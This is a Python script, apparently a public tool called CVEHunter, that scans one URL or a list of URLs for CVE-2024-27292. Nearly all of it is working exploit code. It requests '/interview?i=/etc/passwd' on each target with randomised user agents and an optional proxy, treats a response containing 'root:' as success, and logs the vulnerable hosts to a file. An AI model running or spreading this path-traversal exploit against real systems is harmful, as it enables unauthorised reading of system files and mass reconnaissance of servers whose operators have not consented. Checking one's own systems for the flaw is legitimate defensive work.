import asyncio
import argparse
import aiofiles
from alive_progress import alive_bar
from fake_useragent import UserAgent
from colorama import Fore, Style
import ssl
import httpx
import random
import os

green = Fore.GREEN
magenta = Fore.MAGENTA
cyan = Fore.CYAN
mixed = Fore.RED + Fore.BLUE
red = Fore.RED
blue = Fore.BLUE
yellow = Fore.YELLOW
white = Fore.WHITE
reset = Style.RESET_ALL
bold = Style.BRIGHT
colors = [ green, cyan, blue]
random_color = random.choice(colors)

def banner():
    banner=f"""{bold}{random_color}
  ____ __     __ _____  _   _                _               
 / ___|\ \   / /| ____|| | | | _   _  _ __  | |_   ___  _ __ 
| |     \ \ / / |  _|  | |_| || | | || '_ \ | __| / _ \| '__|
| |___   \ V /  | |___ |  _  || |_| || | | || |_ |  __/| |   
 \____|   \_/   |_____||_| |_| \__,_||_| |_| \__| \___||_| 
     CVE-2024-27292                      {bold}{white}@th3gokul{reset}\n"""
    return banner


print (banner())


parser = argparse.ArgumentParser(description=f"[{bold}{blue}Description{reset}]: {bold}{white}Vulnerability Detection and Exploitation  tool for CVE-2024-27292" , usage=argparse.SUPPRESS)
parser.add_argument("-u", "--url", type=str, help=f"[{bold}{blue}INF{reset}]: {bold}{white}Specify a URL or domain for vulnerability detection")
parser.add_argument("-l", "--list", type=str, help=f"[{bold}{blue}INF{reset}]: {bold}{white}Specify a list of URLs for vulnerability detection")
parser.add_argument("-t", "--threads", type=int, default=1, help=f"[{bold}{blue}INF{reset}]: {bold}{white}Number of threads for list of URLs")
parser.add_argument("-proxy", "--proxy", type=str, help=f"[{bold}{blue}INF{reset}]: {bold}{white}Proxy URL to send request via your proxy")
parser.add_argument("-v", "--verbose", action="store_true", help=f"[{bold}{blue}INF{reset}]: {bold}{white}Increases verbosity of output in console")
parser.add_argument("-o", "--output", type=str, help=f"[{bold}{blue}INF{reset}]: {bold}{white}Filename to save output of vulnerable target{reset}]")
args=parser.parse_args()


async def save(result):
    try:
            if args.output:
                if os.path.isfile(args.output):
                    filename = args.output
                elif os.path.isdir(args.output):
                    filename = os.path.join(args.output, f"results.txt")
                else:
                    filename = args.output
            else:
                    filename = "results.txt"
            async with aiofiles.open(filename, "a") as w:
                    await w.write(result + '\n')
    except KeyboardInterrupt as e:        
        quit()
    except asyncio.CancelledError as e:
        SystemExit
    except Exception as e:
        pass



async def exploit(session,url,sem,bar):
    try:

        base_url=f'{url}/interview?i=/etc/passwd'
        header={
            "User-Agent": UserAgent().random
        }

        async with session.stream("GET", base_url, headers=header , follow_redirects=True , timeout=30) as response:
            
            response = await response.aread()
            response = response.decode("utf-8")

            if "root:" in response:
                
                print(f"{bold}{white}[vuln]: {url}{reset}")
                await save(f"Vulnerable: {base_url}")


    except (httpx.ConnectError, httpx.RequestError, httpx.TimeoutException) as e:
        if args.verbose:
            print(f"[{bold}{red}Timeout{reset}]: {bold}{white}{url}{reset}")  
    except ssl.SSLError as e:
        pass
    except httpx.InvalidURL:
        pass
    except KeyboardInterrupt :
        SystemExit
    except asyncio.CancelledError:
        SystemExit
    except Exception as e:
        if args.verbose:
            print(f"Exception in exploit: {e}, {type(e)}")
    finally:
        bar()
        sem.release()
    


async def loader(urls, session, sem, bar):
    try:
        tasks = []
        for url in urls:
            await sem.acquire() 
            task = asyncio.ensure_future(exploit(session, url, sem, bar))
            tasks.append(task)
        await asyncio.gather(*tasks, return_exceptions=False)
    except KeyboardInterrupt as e:
        SystemExit
    except asyncio.CancelledError as e:
        SystemExit
    except Exception as e:
        if args.verbose:
            print(f"Exception in loader: {e}, {type(e)}")

async def threads(urls):
    try:
        urls = list(set(urls))
        sem = asyncio.BoundedSemaphore(args.threads)
        proxy = args.proxy if args.proxy else None
        async with httpx.AsyncClient(verify=False, proxy=proxy) as session:
            with alive_bar(title=f"CVEHunter", total=len(urls), enrich_print=False) as bar:
                await loader(urls, session, sem, bar)
    except RuntimeError as e:
        pass
    except KeyboardInterrupt as e:
        SystemExit
    except Exception as e:
        if args.verbose:
            print(f"Exception in threads: {e}, {type(e)}")


async def main():
    try:
        urls = []
        if args.url:
            if args.url.startswith("https://") or args.url.startswith("http://"):
                urls.append(args.url)
            else:
                new_url = f"https://{args.url}"
                urls.append(new_url)
                new_http = f"http://{args.url}"
                urls.append(new_http)
            await threads(urls)
                
        if args.list:
            async with aiofiles.open(args.list, "r") as streamr:
                async for url in streamr:
                    url = url.strip()
                    if url.startswith("https://") or url.startswith("http://"):
                        urls.append(url)
                    else:
                        new_url = f"https://{url}"
                        urls.append(new_url)
                        new_http = f"http://{url}"
                        urls.append(new_http)
            await threads(urls)

    except FileNotFoundError as e:
        print(f"[{bold}{red}WRN{reset}]: {bold}{white}{args.list} no such file or directory{reset}")
        SystemExit
        
    except Exception as e:
        print(f"Exception in main: {e}, {type(e)}")

if __name__ == "__main__":
    asyncio.run(main())
  
